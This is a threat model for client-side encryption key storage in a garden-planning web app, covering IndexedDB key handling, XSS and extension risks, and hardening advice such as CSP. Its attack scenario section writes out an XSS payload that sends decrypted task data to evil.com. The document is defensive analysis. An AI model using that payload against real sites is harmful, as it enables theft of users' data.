# Encryption Key Storage Threat Model

**Date:** 2026-03-31
**Scope:** Client-side encryption in GardenPlanner (`src/js/encryption.js`, `src/js/security.js`)
**Architecture:** Pure frontend PWA with AES-GCM encryption via Web Crypto API

---

## 1. System Overview

### 1.1 What Is Encrypted

GardenPlanner encrypts all user data stored under `gartenplaner_*` keys in localStorage:

- **Garden tasks** (`gartenplaner_tasks`) -- task titles, descriptions, assigned employees, locations, due dates
- **Archived tasks** (`gartenplaner_archived_tasks`)
- **User settings and preferences**

Data is encrypted transparently through the `SafeStorage` wrapper (defined in `error-handler.js`), which calls `DataEncryption.encrypt()` on write and `DataEncryption.decrypt()` on read.

### 1.2 What Is NOT Encrypted

- The encryption key itself (stored as a `CryptoKey` object in IndexedDB)
- The PBKDF2 salt for password-based key derivation (`_gartenplaner_salt` in localStorage)
- Error logs (`gartenplaner_errors`)
- Application configuration (`APP_CONFIG`)
- The application code itself (HTML, JS, CSS)

### 1.3 Encryption Flow

```
User Action (save task)
        |
        v
SafeStorage.setItem(key, data)
        |
        v
DataEncryption.encrypt(data)
  1. Serialize to JSON string
  2. Generate random 12-byte IV (crypto.getRandomValues)
  3. AES-GCM encrypt with stored CryptoKey
  4. Concatenate IV + ciphertext
  5. Base64-encode
        |
        v
localStorage.setItem(key, { encrypted: true, data: base64, algorithm: "AES-GCM", version: 1 })
```

---

## 2. Key Management

### 2.1 Key Generation

- **Algorithm:** AES-GCM, 256-bit
- **API:** `window.crypto.subtle.generateKey()`
- **Extractability:** Keys are generated as `non-extractable`, meaning `crypto.subtle.exportKey()` cannot be used to read the raw key material from JavaScript
- **Trigger:** Automatically on first application load if no existing key is found

### 2.2 Key Storage

**Current storage: IndexedDB**

The `CryptoKey` object is stored directly in IndexedDB database `_gartenplaner_keystore`, object store `keys`, under the key `enc_key`.

- IndexedDB can store `CryptoKey` objects natively via the Structured Clone Algorithm
- The `non-extractable` flag is preserved across storage -- JavaScript code cannot call `exportKey()` on the retrieved key
- A migration path exists from a legacy approach that stored JWK-exported keys in localStorage (see `_migrateFromLocalStorage()`)

### 2.3 Key Rotation

- `rotateKey()` decrypts all `gartenplaner_*` items with the old key, generates a new key, and re-encrypts all data
- Includes rollback logic: if rotation fails mid-way, original values are restored
- Recommended interval: every 6-12 months (manual trigger)

### 2.4 Key Export/Import

- Export requires a password (minimum 8 characters)
- Password-based key derivation uses PBKDF2 with SHA-256, 100,000 iterations
- The export produces an encrypted bundle, not the raw key material
- Import restores the key into IndexedDB as non-extractable

---

## 3. Threat Boundaries

### 3.1 What This Architecture Protects Against

| Threat | Protection Level | Explanation |
|--------|-----------------|-------------|
| **Casual physical access** | Moderate | Someone opening DevTools > Application > LocalStorage sees only Base64 ciphertext, not plaintext task data. Without the CryptoKey from IndexedDB and the application code to decrypt, the data is opaque. |
| **localStorage data export** | Moderate | If an attacker copies only localStorage entries (e.g., via a backup tool that does not include IndexedDB), the encrypted data is unusable without the key. |
| **Data at rest confidentiality (same-origin)** | Moderate | The non-extractable CryptoKey prevents JavaScript from reading raw key bytes, limiting what a brief script injection could exfiltrate. |
| **Accidental data exposure in logs** | Good | Encrypted values in localStorage do not reveal personal information if accidentally logged or included in error reports. |

### 3.2 What This Architecture Does NOT Protect Against

| Threat | Risk Level | Explanation |
|--------|-----------|-------------|
| **XSS (Cross-Site Scripting)** | **HIGH** | An XSS payload running in the same origin can call `window.dataEncryption.decrypt()` or `SafeStorage.getItem()` to read all data in plaintext. The key is non-extractable but fully usable by any script in the page context. This is the most critical gap. |
| **Browser extensions with host permissions** | **HIGH** | Extensions with access to the page can invoke the decryption API or read DOM content after decryption. |
| **Physical access with browser open** | **HIGH** | If the browser session is active, an attacker can use DevTools console to call `SafeStorage.getItem()` and retrieve all data. |
| **Compromised device / malware** | **HIGH** | Malware with access to the browser profile directory can read IndexedDB files on disk (they are stored unencrypted by the browser) and localStorage LevelDB files. Both key and ciphertext are accessible. |
| **Same-origin attacks** | **HIGH** | Any JavaScript executing in the same origin (via XSS, compromised dependency, malicious third-party script) has full access to both the key (via the `window.dataEncryption` API) and the encrypted data. |
| **Browser profile copy/theft** | **HIGH** | Copying the browser profile directory gives an attacker both IndexedDB (with the CryptoKey) and localStorage (with the ciphertext). The non-extractable flag is enforced by the browser's in-memory crypto module, not by on-disk encryption. |
| **Shared computer without OS-level user separation** | **MEDIUM** | Another user on the same OS account can open the browser and access all data. |
| **Forensic recovery** | **MEDIUM** | Browser storage is not securely erased. Deleted keys and data may be recoverable from disk. |

---

## 4. Detailed Risk Analysis

### 4.1 IndexedDB Key Storage Risks

**No encryption at rest:** IndexedDB databases are stored as files on disk (e.g., LevelDB in Chromium, SQLite in Firefox). The `CryptoKey` object's non-extractable property is a runtime enforcement by the Web Crypto API -- it does not encrypt the key material on disk. A determined attacker with file system access can extract the raw key bytes from the IndexedDB storage files.

**Same-origin accessibility:** Any script running in the application's origin can open the `_gartenplaner_keystore` database, read the `CryptoKey`, and use it for decryption. The `Object.freeze()` on `DataEncryption.prototype` prevents prototype pollution but does not prevent direct IndexedDB access.

**No access control:** IndexedDB has no built-in authentication or access control beyond the same-origin policy. There is no PIN, password, or biometric gate before the key can be used.

**Persistence:** The key persists indefinitely until explicitly deleted. There is no automatic expiration or session-based key lifecycle.

### 4.2 localStorage Residual Risks

- The PBKDF2 salt (`_gartenplaner_salt`) is stored in plaintext in localStorage. While a salt is not secret by design, its presence reveals that password-based key derivation is in use.
- The migration code in `_migrateFromLocalStorage()` imports keys as non-extractable, which is correct. However, the legacy localStorage key (if it existed) was a JWK in plaintext -- any historical backup of localStorage may contain the raw key.
- The `rotateKey()` method iterates over localStorage to find encrypted items, which means it relies on the `gartenplaner_` naming convention. Misnamed keys would be skipped.

### 4.3 Fallback Behavior Risk

When encryption is unavailable (no Web Crypto API support, or key generation failure), data is stored **unencrypted** with `{ encrypted: false, data: <plaintext> }`. This silent degradation means:

- Users may believe their data is encrypted when it is not
- There is no user-facing notification of the fallback
- The `console.warn()` is only visible in DevTools

### 4.4 Key Loss = Data Loss

If the IndexedDB key is deleted (browser data cleared, profile reset, `clearKeys()` called), all encrypted localStorage data becomes permanently unrecoverable unless the user has a key backup. There is no server-side key escrow.

---

## 5. Attack Scenarios

### Scenario 1: XSS via Task Description

An attacker injects `<img src=x onerror="fetch('https://evil.com/steal?d='+JSON.stringify(await SafeStorage.getItem('gartenplaner_tasks')))">` into a task description. If the XSS protection in `security.js` has a bypass (e.g., a rendering path that does not call `escapeHtml()`), the attacker exfiltrates all decrypted task data.

**Mitigation in place:** `Security.escapeHtml()` and input validation.
**Residual risk:** Any missed escaping path or future code change that bypasses security utilities.

### Scenario 2: Malicious Browser Extension

A browser extension with `<all_urls>` permission injects a content script that calls `window.dataEncryption.decrypt()` on all localStorage items and sends the results to a remote server.

**Mitigation in place:** None. This is outside the browser security model for extensions.

### Scenario 3: Shared Kiosk Computer

A user accesses GardenPlanner on a shared computer and forgets to clear browser data. The next user opens the same browser and has full access to the previous user's encrypted data through the application UI.

**Mitigation in place:** None. No session timeout or authentication layer.

---

## 6. Comparison with Alternatives

| Approach | XSS Protection | Disk Protection | Key Management |
|----------|---------------|-----------------|----------------|
| **Current (IndexedDB + non-extractable CryptoKey)** | None (key usable by any same-origin script) | None (browser stores key in plaintext on disk) | Automatic, no user friction |
| **Password-derived key (not stored)** | Partial (key only in memory during session) | Better (no key on disk; requires password each session) | Higher friction; password fatigue |
| **Server-side encryption** | Good (key never in browser) | Good (data encrypted server-side) | Requires backend infrastructure |
| **WebAuthn-bound keys** | Good (key usage requires biometric/PIN) | Good (hardware-bound) | Limited browser support; requires authenticator |

---

## 7. Recommendations

### High Priority

1. **Content Security Policy (CSP):** Deploy a strict CSP header to mitigate XSS, which is the primary threat that bypasses client-side encryption entirely.
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'
   ```

2. **User notification on encryption fallback:** Replace the silent `console.warn()` with a visible UI banner when encryption is unavailable, so users know their data is stored unencrypted.

3. **Session-based key unlock:** Consider requiring a user-provided PIN or password to unlock the encryption key at the start of each session, rather than auto-loading from IndexedDB. This would prevent passive access by someone who opens the browser.

### Medium Priority

4. **Subresource Integrity (SRI):** Add integrity attributes to all script tags to prevent tampering with the encryption or security modules via CDN compromise or MITM (relevant if scripts are ever served from external sources).

5. **Automatic key expiration:** Implement a maximum key age (e.g., 90 days) after which the application prompts the user to rotate the key. The current recommendation of 6-12 months is manual and easy to forget.

6. **Secure deletion:** When `clearKeys()` is called, overwrite the IndexedDB entry before deleting to reduce forensic recoverability (note: effectiveness depends on browser implementation).

7. **Audit logging:** Log all key operations (generation, rotation, export, import, deletion) with timestamps to a tamper-evident log. The current implementation logs to console, which is ephemeral.

### Low Priority / Future Architecture

8. **Server-side encryption for sensitive data:** If GardenPlanner adds cloud sync or a backend, encrypt sensitive fields (employee names, locations, task descriptions) server-side with keys managed in a proper KMS. Client-side encryption should be treated as a defense-in-depth layer, not the primary protection.

9. **WebAuthn / FIDO2 key binding:** When browser support matures, bind encryption keys to a hardware authenticator so that key usage requires biometric or PIN verification. This addresses both the XSS and physical access threats.

10. **Per-field encryption granularity:** Instead of encrypting the entire task blob, consider encrypting only PII fields (employee names, descriptions) individually. This would allow non-sensitive queries (e.g., task counts, dates) without decryption.

---

## 8. Summary

The current encryption implementation uses strong cryptographic primitives (AES-GCM 256-bit, Web Crypto API, non-extractable keys) and represents a solid defense-in-depth measure for a client-side application. The IndexedDB key storage is the best available option in a pure frontend architecture, and the migration away from localStorage JWK storage was a significant improvement.

However, **client-side encryption cannot protect against same-origin JavaScript attacks (XSS)**. Since the decryption key is always available to any script running in the page context, the encryption is effectively transparent to an attacker who achieves code execution. The primary protection is therefore the XSS prevention layer in `security.js`, not the encryption itself.

**Key takeaway:** The encryption protects data at rest in browser storage against casual inspection and partial data exfiltration (e.g., localStorage-only backups). It does not constitute a security boundary against active attacks. The highest-impact improvement would be deploying a strict Content Security Policy to harden the XSS prevention that the encryption relies on.
